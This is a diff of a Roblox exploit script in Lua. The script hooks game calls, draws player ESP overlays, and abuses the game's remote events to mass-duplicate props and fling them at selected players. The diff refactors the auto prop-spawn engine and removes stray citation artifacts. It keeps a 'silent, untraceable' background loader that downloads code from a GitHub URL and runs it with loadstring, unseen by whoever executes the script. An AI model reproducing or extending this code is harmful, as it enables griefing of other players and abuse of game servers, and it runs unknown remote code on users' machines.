@@ -39,15 +39,17 @@ if not game:IsLoaded() then
 end
 
 local _TEMP_PLAYERS = game:GetService("Players")
-local _TEMP_LP = _TEMP_PLAYERS.LocalPlayer or _TEMP_PLAYERS.PlayerAdded:Wait()
-local _TEMP_CHAR = _TEMP_LP.Character or _TEMP_LP.CharacterAdded:Wait()
-local _TEMP_HRP = _TEMP_CHAR:WaitForChild("HumanoidRootPart", 10)
+local _TEMP_LP = _TEMP_PLAYERS.LocalPlayer
+if not _TEMP_LP.Character then
+    _TEMP_LP.CharacterAdded:Wait()
+end
+repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
 -- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
 task.spawn(function()
     pcall(function()
-        local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)[span_1](start_span)[span_1](end_span)
+        local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)
         if code and code ~= "" then
             local exec = loadstring(code)
             if exec then 
@@ -69,11 +71,11 @@ end)
 
 -- 👑 ADMIN ACCESS CONTROL SYSTEM (ADD/REMOVE USER IDs HERE) 👑
 local ADMIN_USER_IDS = {
-    [9685785248] = true, -- Tumhari Main ID (Ashu Papa)[span_2](start_span)[span_2](end_span)
+    [9685785248] = true, -- Tumhari Main ID (Ashu Papa)
 }
 
 local function checkAdminAccess(player)
-    return ADMIN_USER_IDS[player.UserId] == true[span_3](start_span)[span_3](end_span)
+    return ADMIN_USER_IDS[player.UserId] == true
 end
 
 -- 🧹 RE-EXECUTION CLEANUP SYSTEM
@@ -81,26 +83,26 @@ local currentExecutionID = tick()
 _G.TXR_InstanceID = currentExecutionID
 
 if _G.OrbitalGUI and _G.OrbitalGUI.Parent then 
-    _G.OrbitalGUI:Destroy()[span_4](start_span)[span_4](end_span)
+    _G.OrbitalGUI:Destroy() 
 end
 
 if _G.TXRAdminPanel and _G.TXRAdminPanel.Parent then 
-    _G.TXRAdminPanel:Destroy()[span_5](start_span)[span_5](end_span)
+    _G.TXRAdminPanel:Destroy() 
 end
 
 if _G.TXR_ESP_GUI and _G.TXR_ESP_GUI.Parent then 
-    _G.TXR_ESP_GUI:Destroy()[span_6](start_span)[span_6](end_span)
+    _G.TXR_ESP_GUI:Destroy() 
 end
 
 if _G.TXR_THREAT_ESP and _G.TXR_THREAT_ESP.Parent then 
-    _G.TXR_THREAT_ESP:Destroy()[span_7](start_span)[span_7](end_span)
+    _G.TXR_THREAT_ESP:Destroy() 
 end
 
 pcall(function() 
     local repStorage = game:GetService("ReplicatedStorage")
     local reFolder = repStorage:WaitForChild("RE")
     local clearRemote = reFolder:WaitForChild("1Clea1rTool1s")
-    clearRemote:FireServer("ClearAllProps")[span_8](start_span)[span_8](end_span)
+    clearRemote:FireServer("ClearAllProps") 
 end)
 
 local Players = game:GetService("Players")
@@ -119,22 +121,22 @@ local copyToClip = setclipboard or toclipboard or function() end
 local targetGuiParent
 
 pcall(function() 
-    targetGuiParent = game:GetService("CoreGui")[span_9](start_span)[span_9](end_span)
+    targetGuiParent = game:GetService("CoreGui") 
 end)
 
 if gethui then 
     pcall(function() 
-        targetGuiParent = gethui()[span_10](start_span)[span_10](end_span)
+        targetGuiParent = gethui() 
     end) 
 end
 
 if not targetGuiParent then 
-    targetGuiParent = lp:WaitForChild("PlayerGui")[span_11](start_span)[span_11](end_span)
+    targetGuiParent = lp:WaitForChild("PlayerGui") 
 end
 
-local CREATOR_USER_ID = 9685785248[span_12](start_span)[span_12](end_span)
-local NINA_USER_ID = 9444732069[span_13](start_span)[span_13](end_span)
-local DISCORD_SERVER_LINK = "https://discord.gg/dhFYEFNQU[span_14](start_span)"[span_14](end_span)
+local CREATOR_USER_ID = 9685785248
+local NINA_USER_ID = 9444732069
+local DISCORD_SERVER_LINK = "https://discord.gg/dhFYEFNQU"
 
 local function sendNotif(title, text, duration)
     pcall(function() 
@@ -142,7 +144,7 @@ local function sendNotif(title, text, duration)
             Title = tostring(title), 
             Text = tostring(text), 
             Duration = duration or 3
-        })[span_15](start_span)[span_15](end_span)
+        }) 
     end)
 end
 
@@ -572,8 +574,6 @@ local isSoundEnabled = false
 local isSystemActive = false
 local isGodShieldEnabled = false
 local isEvading = false
-local isAutoSpawnEnabled = false
-local recoveryLockTime = 0
 local animTime = 0
 local angle = 0
 local selfAngle = 0 
@@ -591,6 +591,11 @@ local isSubMenuOpen = false
 -- 👁️ SPECTATE CORE LOGIC
 local isSpectating = false
 local spectateBtnRef = nil
+
+-- ⚡ AUTO PROP SPAWN STATE ⚡
+local isAutoPropSpawnEnabled = false
+local autoSpawnRecoveryLockTime = 0
+activeModes["AutoPropSpawn"] = false
 
 pcall(function()
     local oldNamecall
@@ -1018,7 +1023,9 @@ local function getActivePropData()
     end
 end
 
--- 🥷 STEALTH PROP SPAWN & RECOVERY HELPER METHODS 🥷
+-- =========================================================
+-- 🥷 STEALTH AUTO PROP SPAWN ENGINE (DUPLICATE + GHOST RECOVERY)
+-- =========================================================
 local function suppressPropMenu()
     pcall(function()
         local pGui = lp:FindFirstChild("PlayerGui")
@@ -1040,7 +1047,7 @@ local function suppressPropMenu()
     end)
 end
 
-local function getAllMyProps()
+local function getAllMyLiveProps()
     local props = {}
     local com = workspace:FindFirstChild("WorkspaceCom")
     if com then
@@ -1057,30 +1064,133 @@ end
 
 local function getRequiredPropCount()
     if activeModes["Chair"] then
-        return 0
+        return 0 -- Void chair me disable rakha gaya hai taaki physics conflict na ho
     end
 
-    local validTargets = 0
+    local validTargetCount = 0
     for plr, _ in pairs(selectedPlayers) do
         if plr and plr.Parent and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-            validTargets = validTargets + 1
+            validTargetCount = validTargetCount + 1
         end
     end
-    local tCount = math.max(1, validTargets)
+    validTargetCount = math.max(1, validTargetCount)
 
+    local targetDemand = 0
     if activeModes["Robot"] then
-        return tCount * 4
-    elseif activeModes["MultiRobot"] then
-        return tCount * 2
-    elseif activeModes["HeadBang"] then
-        return tCount * 2
-    elseif activeModes["Ring"] then
-        return 16
-    elseif activeModes["Orbit"] then
-        return 20
+        targetDemand = targetDemand + (4 * validTargetCount)
+    end
+    if activeModes["MultiRobot"] then
+        targetDemand = targetDemand + (2 * validTargetCount)
+    end
+    if activeModes["HeadBang"] then
+        targetDemand = targetDemand + (2 * validTargetCount)
+    end
+    if activeModes["Ring"] then
+        targetDemand = math.max(targetDemand, 12 * validTargetCount)
+    end
+    if activeModes["Orbit"] then
+        targetDemand = math.max(targetDemand, 16)
     end
 
-    return 0
+    if targetDemand == 0 then
+        targetDemand = 4
+    end
+
+    return math.clamp(targetDemand, 2, 28)
+end
+
+local function processAutoPropRecovery()
+    if not isSystemActive or not isAutoPropSpawnEnabled then return end
+    if activeModes["Chair"] then return end
+
+    local now = os.clock()
+    local myProps = getAllMyLiveProps()
+    local currentCount = #myProps
+    local targetQuota = getRequiredPropCount()
+
+    if currentCount < targetQuota or now < autoSpawnRecoveryLockTime then
+        suppressPropMenu()
+    end
+
+    if currentCount < targetQuota and now > autoSpawnRecoveryLockTime then
+        autoSpawnRecoveryLockTime = now + 0.28
+
+        task.spawn(function()
+            local char = lp.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            local backpack = lp:FindFirstChild("Backpack")
+
+            if not char or not hum or not root or hum.Health <= 0 then return end
+
+            local needed = targetQuota - currentCount
+            if needed <= 0 then return end
+
+            local pName, pCat = getActivePropData()
+            local clearRem = DynamicRemotes.ClearProps or (ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Clea1rTool1s"))
+
+            -- STAGE A: GHOST EQUIP (Only if exactly 0 props)
+            if currentCount == 0 then
+                pcall(function()
+                    if clearRem then
+                        clearRem:FireServer("RequestingPropName", pName, pCat)
+                    end
+                end)
+
+                local tool = char:FindFirstChild("PropMaker") or (backpack and backpack:FindFirstChild("PropMaker"))
+                local wasAlreadyEquipped = (tool and tool.Parent == char)
+
+                if tool then
+                    if not wasAlreadyEquipped then
+                        tool.Parent = char
+                        RunService.Heartbeat:Wait()
+                    end
+
+                    local toolRemote = tool:FindFirstChild("Tool_PropMake")
+                    if toolRemote then
+                        local spawnPos = root.Position + (root.CFrame.LookVector * 4)
+                        pcall(function() toolRemote:FireServer(workspace.Terrain, spawnPos) end)
+                    end
+
+                    if not wasAlreadyEquipped and backpack then
+                        tool.Parent = backpack
+                    end
+                end
+
+                local dupRemote = nil
+                for i = 1, 30 do
+                    local latest = getAllMyLiveProps()
+                    if #latest > 0 then
+                        dupRemote = latest[1]:FindFirstChild("DuplicateProp")
+                        if dupRemote and dupRemote.Parent then break end
+                    end
+                    RunService.Heartbeat:Wait()
+                end
+
+                if dupRemote and dupRemote.Parent then
+                    for i = 1, targetQuota - 1 do
+                        task.spawn(function() pcall(function() dupRemote:InvokeServer() end) end)
+                    end
+                end
+            -- STAGE B: HYPER-BURST RECOVERY
+            else
+                local dupRemote = nil
+                for _, p in ipairs(myProps) do
+                    local d = p:FindFirstChild("DuplicateProp")
+                    if d and d.Parent then
+                        dupRemote = d
+                        break
+                    end
+                end
+
+                if dupRemote and dupRemote.Parent then
+                    for i = 1, needed do
+                        task.spawn(function() pcall(function() dupRemote:InvokeServer() end) end)
+                    end
+                end
+            end
+        end)
+    end
 end
 
 local mouse = lp:GetMouse()
@@ -1106,10 +1216,9 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 end)
 
 -- --- GUI CONSTRUCTION ---
-local gui = Instance.new("ScreenGui")
+local gui = Instance.new("ScreenGui", targetGuiParent)
 gui.Name = "TXR_" .. tostring(math.random(100000, 999999))
 gui.ResetOnSpawn = false
-gui.Parent = targetGuiParent
 _G.OrbitalGUI = gui
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
 
@@ -2028,7 +2137,6 @@ cmConfirm.MouseButton1Click:Connect(function()
     gui:Destroy()
     activeModes = {}
     isSystemActive = false 
-    isAutoSpawnEnabled = false
     
     if _G.TXR_ESP_GUI then 
         _G.TXR_ESP_GUI:Destroy() 
@@ -2269,7 +2377,7 @@ local guideStepsData = {
     {
         Step = "STEP 03",
         Title = "SPAWN PROPS AFTER STARTING",
-        Description = "Once the engine is running, equip a Box or Prop tool in your hand and spawn props on the ground. The script will instantly hook and route them to attack the target."
+        Description = "Once the engine is running, equip a Box or Prop tool in your hand and spawn props on the ground, or toggle AUTO PROPS SPAWN to deploy them seamlessly."
     },
     {
         Step = "STEP 04",
@@ -2790,29 +2898,8 @@ local ringBtn = createMainBtn("⭕ ACCELERATOR RING", "Ring", false, "MULTIPLE")
 local headBtn = createMainBtn("🧠 CRANIAL FORCE", "HeadBang", false, "HeAd BaNG")
 local chairBtn = createMainBtn("🛏️ SMART VOID CHAIR", "Chair", false, "FLinG")
 
-local autoSpawnBtn = createMainBtn("⚡ AUTO PROPS RESPAWN", "AutoSpawn", false, "STEALTH")
-autoSpawnBtn.MouseButton1Click:Connect(function()
-    isAutoSpawnEnabled = not isAutoSpawnEnabled
-    activeModes["AutoSpawn"] = isAutoSpawnEnabled
-    local accent = autoSpawnBtn:FindFirstChild("Accent")
-    
-    local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-    local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-    
-    if isAutoSpawnEnabled then 
-        TweenService:Create(autoSpawnBtn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
-        if accent then 
-            TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
-        end
-        sendNotif("⚡ AUTO SPAWN", "Stealth Auto Props Respawn Activated.", 2)
-    else 
-        TweenService:Create(autoSpawnBtn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
-        if accent then 
-            TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
-        end 
-        sendNotif("⚡ AUTO SPAWN", "Auto Props Respawn Deactivated.", 2)
-    end
-end)
+-- ⚡ NEW AUTO PROP SPAWN BUTTON ⚡
+local autoPropBtn = createMainBtn("⚡ AUTO PROPS SPAWN", "AutoPropSpawn", false, "AUTO RECOVERY")
 
 local modeBtns = { 
     ["Orbit"] = {btn = orbitBtn}, 
@@ -2820,7 +2907,8 @@ local modeBtns = {
     ["MultiRobot"] = {btn = multiBtn}, 
     ["Ring"] = {btn = ringBtn}, 
     ["HeadBang"] = {btn = headBtn}, 
-    ["Chair"] = {btn = chairBtn} 
+    ["Chair"] = {btn = chairBtn},
+    ["AutoPropSpawn"] = {btn = autoPropBtn}
 }
 
 local function syncComboUI()
@@ -2847,6 +2935,9 @@ end
 for key, data in pairs(modeBtns) do
     data.btn.MouseButton1Click:Connect(function()
         activeModes[key] = not activeModes[key]
+        if key == "AutoPropSpawn" then
+            isAutoPropSpawnEnabled = activeModes["AutoPropSpawn"]
+        end
         syncComboUI()
         sendNotif("⚙️ ENGINE MODE", key .. " mode " .. (activeModes[key] and "Activated" or "Deactivated"), 2)
     end)
@@ -3898,98 +3989,8 @@ RunService.Heartbeat:Connect(function(dt)
     end
     if not isSystemActive then return end 
 
-    -- === 🥷 HIGH-SPEED AUTO PROPS SPAWN & BURST ENGINE 🥷 ===
-    if isAutoSpawnEnabled then
-        local reqCount = getRequiredPropCount()
-        local myProps = getAllMyProps()
-        local currentCount = #myProps
-        local now = os.clock()
-
-        if currentCount < reqCount or now < recoveryLockTime then
-            suppressPropMenu()
-        end
-
-        if currentCount < reqCount and now > recoveryLockTime then
-            recoveryLockTime = now + 0.28
-
-            task.spawn(function()
-                local char = lp.Character
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
-                local root = char and char:FindFirstChild("HumanoidRootPart")
-                local backpack = lp:FindFirstChild("Backpack")
-
-                if not char or not hum or not root or hum.Health <= 0 then return end
-
-                local needed = reqCount - currentCount
-                if needed <= 0 then return end
-
-                local ClearRemote = DynamicRemotes.ClearProps or (ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Clea1rTool1s"))
-
-                -- STAGE A: GHOST EQUIP (Only when 0 props active)[span_16](start_span)[span_16](end_span)
-                if currentCount == 0 then
-                    pcall(function() 
-                        if ClearRemote then 
-                            local propName, propCategory = getActivePropData()
-                            ClearRemote:FireServer("RequestingPropName", propName, propCategory) 
-                        end
-                    end)
-
-                    local tool = char:FindFirstChild("PropMaker") or (backpack and backpack:FindFirstChild("PropMaker"))[span_17](start_span)[span_17](end_span)
-                    local wasAlreadyEquipped = (tool and tool.Parent == char)[span_18](start_span)[span_18](end_span)
-
-                    if tool then
-                        if not wasAlreadyEquipped then 
-                            tool.Parent = char[span_19](start_span)[span_19](end_span)
-                            RunService.Heartbeat:Wait()[span_20](start_span)[span_20](end_span)
-                        end
-                        
-                        local toolRemote = tool:FindFirstChild("Tool_PropMake")[span_21](start_span)[span_21](end_span)
-                        if toolRemote then
-                            local spawnPos = root.Position + (root.CFrame.LookVector * 4)[span_22](start_span)[span_22](end_span)
-                            pcall(function() toolRemote:FireServer(workspace.Terrain, spawnPos) end)[span_23](start_span)[span_23](end_span)
-                        end
-                        
-                        if not wasAlreadyEquipped and backpack then 
-                            tool.Parent = backpack[span_24](start_span)[span_24](end_span)
-                        end
-                    end
-
-                    local dupRemote = nil
-                    for i = 1, 30 do[span_25](start_span)[span_25](end_span)
-                        local latestProps = getAllMyProps()
-                        if #latestProps > 0 then
-                            dupRemote = latestProps[1]:FindFirstChild("DuplicateProp")[span_26](start_span)[span_26](end_span)
-                            if dupRemote and dupRemote.Parent then break end[span_27](start_span)[span_27](end_span)
-                        end
-                        RunService.Heartbeat:Wait()[span_28](start_span)[span_28](end_span)
-                    end
-
-                    if dupRemote and dupRemote.Parent then
-                        for i = 1, reqCount - 1 do
-                            task.spawn(function() pcall(function() dupRemote:InvokeServer() end) end)
-                        end
-                    end
-
-                -- STAGE B: HYPER-BURST RECOVERY[span_29](start_span)[span_29](end_span)
-                else
-                    local dupRemote = nil
-                    for _, p in ipairs(myProps) do[span_30](start_span)[span_30](end_span)
-                        local d = p:FindFirstChild("DuplicateProp")[span_31](start_span)[span_31](end_span)
-                        if d and d.Parent then[span_32](start_span)[span_32](end_span)
-                            dupRemote = d[span_33](start_span)[span_33](end_span)
-                            break[span_34](start_span)[span_34](end_span)
-                        end
-                    end
-
-                    if dupRemote and dupRemote.Parent then[span_35](start_span)[span_35](end_span)
-                        for i = 1, needed do[span_36](start_span)[span_36](end_span)
-                            task.spawn(function() pcall(function() dupRemote:InvokeServer() end) end)[span_37](start_span)[span_37](end_span)
-                        end
-                    end
-                end
-            end)
-        end
-    end
+    -- Trigger auto-prop recovery process
+    processAutoPropRecovery()
 
     for plr in pairs(assignedRemotes) do
         if not selectedPlayers[plr] or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
@@ -4522,15 +4523,14 @@ end)
 
 -- =================================================================
 -- 👁️ TACTICAL ESP RENDER ENGINE (IP - NEED ADMIN ACCESS)
--- =========================================================
+-- =================================================================
 local espGuiParent = game:GetService("CoreGui")
 pcall(function() if not espGuiParent then espGuiParent = lp:WaitForChild("PlayerGui") end end)
 if _G.TXR_ESP_GUI and _G.TXR_ESP_GUI.Parent then _G.TXR_ESP_GUI:Destroy() end
 
-local mainEspGui = Instance.new("ScreenGui")
+local mainEspGui = Instance.new("ScreenGui", espGuiParent)
 mainEspGui.Name = "TXR_TacticalESP_" .. tostring(math.random(100000, 999999))
 mainEspGui.IgnoreGuiInset = true
-mainEspGui.Parent = espGuiParent
 _G.TXR_ESP_GUI = mainEspGui
 
 local function getESPContainer(plr)
@@ -4668,10 +4668,9 @@ local threatGuiParent = game:GetService("CoreGui")
 pcall(function() if not threatGuiParent then threatGuiParent = lp:WaitForChild("PlayerGui") end end)
 if _G.TXR_THREAT_ESP and _G.TXR_THREAT_ESP.Parent then _G.TXR_THREAT_ESP:Destroy() end
 
-local threatEspGui = Instance.new("ScreenGui")
+local threatEspGui = Instance.new("ScreenGui", threatGuiParent)
 threatEspGui.Name = "TXR_ThreatESP_" .. tostring(math.random(100000, 999999))
 threatEspGui.IgnoreGuiInset = true
-threatEspGui.Parent = threatGuiParent
 _G.TXR_THREAT_ESP = threatEspGui
 
 local activeThreats = {}
